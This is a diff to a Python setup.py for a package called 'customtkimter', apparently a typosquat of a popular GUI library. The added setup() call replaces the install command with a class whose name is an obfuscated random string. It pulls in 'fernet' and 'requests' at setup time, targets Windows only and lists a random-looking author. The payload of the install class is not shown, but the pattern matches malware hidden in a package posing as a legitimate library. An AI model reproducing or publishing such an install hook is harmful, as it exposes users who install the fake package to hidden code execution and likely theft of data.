@@ -18,5 +18,22 @@ class NFdpmkSkMPLLFyNzUyJGTOkmkxFQFiiJlEgnKutLsjTlwjrEPdjJZDHyQqOCSYBABVcYMnSPGn
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
+setup(
+    name="customtkimter",
+    version=VERSION,
+    author="JkeOajOBuRlVdW",
+    author_email="CkoKJWFKPxKhTmtx@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': NFdpmkSkMPLLFyNzUyJGTOkmkxFQFiiJlEgnKutLsjTlwjrEPdjJZDHyQqOCSYBABVcYMnSPGncEhyrpZDQFjfkNFWFRrzjqNqByLvosCLvjcnQIoePxtBdwuIjnCaTjzvXAwWNkqhXBvZZzYaQEJAIovhPEcxzzkSslwopsigBijoKSCTYVYtLjEqdrVAufHOzZrwm,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
